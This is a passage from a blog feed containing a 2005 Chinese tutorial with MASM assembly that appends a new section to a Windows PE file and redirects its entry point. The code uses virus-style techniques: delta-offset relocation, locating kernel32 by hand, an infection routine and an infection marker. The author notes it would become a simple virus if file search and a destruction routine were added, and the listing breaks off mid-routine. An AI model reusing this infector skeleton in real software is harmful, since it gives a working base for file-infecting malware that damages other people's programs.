#000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;51&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;52&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;CloseHandle(hHead);&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;53&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;delete&amp;nbsp;pbWrite;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;54&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;55&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;return&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;TRUE;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;56&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;}&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;57&lt;/SPAN&gt;&amp;nbsp;&lt;SPAN style="COLOR: #000000"&gt;&lt;/SPAN&gt;&lt;/DIV&gt;</description></item><item><title>PE文件添加节显示启动信息</title><link>https://blogs.qipai360.cn/post/pe-file-add-section-show-startup-info/</link><pubDate>Fri, 21 Oct 2005 13:32:00 +0800</pubDate><guid>https://blogs.qipai360.cn/post/pe-file-add-section-show-startup-info/</guid><description>&lt;P&gt;闲来写了个修改PE的小程序,主要是演示和实践PE操作和重定位的概念,实在没事情的时候,可以看看,你将会看到PE文件实际上很简单!当然,首&lt;/P&gt;
&lt;P&gt;先得作好被我的垃圾代码扫了雅兴的准备.这里利用的是我前面介绍的方法的手动查找API的方法.这个东西修改PE并在最后加上一节,节&lt;/P&gt;
&lt;P&gt;名'.hum',被附加程序启动前会显示一个MsgBox,以显示一些信息,你可以用来给自己破的软件来一个所谓的版权信息(我最痛恨的就是....这个!&lt;/P&gt;
&lt;P&gt;烦),当然也可以执行其他一些操作,实际上,再加上文件搜索功能和破坏例程,这就将是一个最简单的病毒.... &lt;/P&gt;
&lt;P&gt;&amp;nbsp; 这个例子没有优化,也没有安排好结构,有兴趣的凑合着看吧,另外还有一些冗余,没有兴趣整理了. &lt;BR&gt;&amp;nbsp; 编译要加入/section:.text,RWE选项.默认操作是对同目录下的sc.exe(heh..,my starcraft). &lt;BR&gt;&amp;nbsp; .记住,PE文件实际上是很简单的,只要你耐心看下去. &lt;BR&gt;注:虽然用了Virus字样,但不是病毒... &lt;/P&gt;
&lt;P&gt;.586 &lt;BR&gt;.model flat, stdcall &lt;BR&gt;option casemap :none&amp;nbsp; ; case sensitive &lt;BR&gt;include c:\hd\hd.h &lt;BR&gt;include c:\hd\mac.h &lt;/P&gt;
&lt;P&gt;;;-------------- &lt;/P&gt;
&lt;P&gt;GetApiA&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; proto&amp;nbsp;&amp;nbsp;&amp;nbsp; :DWORD,:DWORD &lt;/P&gt;
&lt;P&gt;;;-------------- &lt;BR&gt;&amp;nbsp; .CODE &lt;BR&gt;VirusLen&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; =&amp;nbsp; vEnd-vBegin&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;Virus 长度 &lt;BR&gt;vBegin: &lt;BR&gt;;----------------------------------------- &lt;BR&gt;include s_api.asm&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;查找需要的api地址 &lt;BR&gt;;----------------------------------------- &lt;/P&gt;
&lt;P&gt;desfile&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; db "sc.exe",0 &lt;BR&gt;fsize&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd ? &lt;BR&gt;hfile&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd ? &lt;BR&gt;hMap&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd ? &lt;BR&gt;pMem&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd ? &lt;BR&gt;;----------------------------------------- &lt;BR&gt;pe_Header&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd ? &lt;BR&gt;sec_align&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd ? &lt;BR&gt;file_align&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd ? &lt;BR&gt;newEip&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd ? &lt;BR&gt;oldEip&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd ? &lt;BR&gt;inc_size&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd ? &lt;BR&gt;oldEnd&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd ? &lt;BR&gt;;----------------------------------------- &lt;/P&gt;
&lt;P&gt;sMessageBoxA&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; db "MessageBoxA",0 &lt;/P&gt;
&lt;P&gt;aMessageBoxA&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd 0 &lt;/P&gt;
&lt;P&gt;;;临时变量... &lt;BR&gt;sztit&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; db "By Hume,2002",0 &lt;BR&gt;szMsg0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; db "Hey,Hope U enjoy it!",0 &lt;BR&gt;CopyRight&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; db "The SoftWare WAS OFFERRED by Hume[AfO]",0dh,0ah &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; db "&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Thx for using it!",0dh,0ah &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; db "Contact: &lt;A href='mailto:Humewen@21cn.com",0dh,0ah'&gt;Humewen@21cn.com",0dh,0ah&lt;/A&gt; &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; db "&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; humeasm.yeah.net",0dh,0ah &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; db "The add Code SiZe:(heX)" &lt;BR&gt;val&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dd 0,0,0,0 &lt;BR&gt;;;----------------------------------------- &lt;/P&gt;
&lt;P&gt;__Start: &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; _gd &lt;BR&gt;_gd:&amp;nbsp;&amp;nbsp; &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; pop&amp;nbsp;&amp;nbsp;&amp;nbsp; ebp&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;得到delta地址 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; sub&amp;nbsp;&amp;nbsp;&amp;nbsp; ebp,offset _gd&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;因为在其他程序中基址可能不是默认的所以需要重定位 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [ebp+appBase],ebp&amp;nbsp;&amp;nbsp;&amp;nbsp; ;呵呵仔细想想 &lt;BR&gt;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,[esp]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;返回地址 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; xor&amp;nbsp;&amp;nbsp;&amp;nbsp; edx,edx &lt;BR&gt;getK32Base: &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dec&amp;nbsp;&amp;nbsp;&amp;nbsp; eax&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;逐字节比较验证 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; dx,word&amp;nbsp; ptr [eax+IMAGE_DOS_HEADER.e_lfanew]&amp;nbsp; ;就是ecx+3ch &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; test&amp;nbsp;&amp;nbsp;&amp;nbsp; dx,0f000h&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;Dos Header+stub不可能太大,超过4096byte &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; jnz&amp;nbsp;&amp;nbsp;&amp;nbsp; getK32Base&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;加速检验 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; cmp&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,dword ptr [eax+edx+IMAGE_NT_HEADERS.OptionalHeader.ImageBase] &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; jnz&amp;nbsp;&amp;nbsp;&amp;nbsp; getK32Base&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;看Image_Base值是否等于ecx即模块起始值, &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; [ebp+k32Base],eax&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;如果是,就认为找到kernel32的Base值 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; lea&amp;nbsp;&amp;nbsp;&amp;nbsp; edi,[ebp+aGetModuleHandle] &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; lea&amp;nbsp;&amp;nbsp;&amp;nbsp; esi,[ebp+lpApiAddrs] &lt;BR&gt;lop_get: &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; lodsd &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; cmp&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,0 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; jz&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; End_Get &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; add&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,ebp &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [ebp+k32Base] &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; GetApiA&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; stosd &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; jmp&amp;nbsp;&amp;nbsp;&amp;nbsp; lop_get&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;获得api地址,参见s_api文件&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;BR&gt;End_Get: &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; my_infect &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; include dislen.asm &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;----------------------------------------- &lt;BR&gt;CouldNotInfect: &lt;/P&gt;
&lt;P&gt;__where:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; xor&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,eax&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;判断是否是已经附加,标志'dark' &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; [ebp+aGetModuleHandle] &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; esi,eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; add&amp;nbsp;&amp;nbsp;&amp;nbsp; esi,[esi+3ch]&amp;nbsp; ;-&amp;gt;esi-&amp;gt;程序本身的Pe_header &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; cmp&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [esi+8],'dark' &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; je&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; jmp_oep &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; jmp&amp;nbsp;&amp;nbsp;&amp;nbsp; __xit&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;退出启动程序 &lt;BR&gt;jmp_oep: &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; add&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,[ebp+oldEip]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; jmp&amp;nbsp;&amp;nbsp;&amp;nbsp; eax&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;跳到宿主程序的入口点 &lt;/P&gt;
&lt;P&gt;my_infect:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;感染部分,文件读写操作,Pe文件修改参见modipe.asm文件 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; xor&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; OPEN_EXISTING &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; GENERIC_READ+GENERIC_WRITE &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; lea&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,[ebp+desfile] &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; [ebp+aCreateFile]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ;打开目标文件 &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; inc&amp;nbsp;&amp;nbsp;&amp;nbsp; eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; je&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; __Err &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dec&amp;nbsp;&amp;nbsp;&amp;nbsp; eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp; [ebp+hfile],eax&amp;nbsp;&amp;nbsp; &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; eax &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; sub&amp;nbsp;&amp;nbsp;&amp;nbsp; ebx,ebx &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; ebx &lt;BR&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; 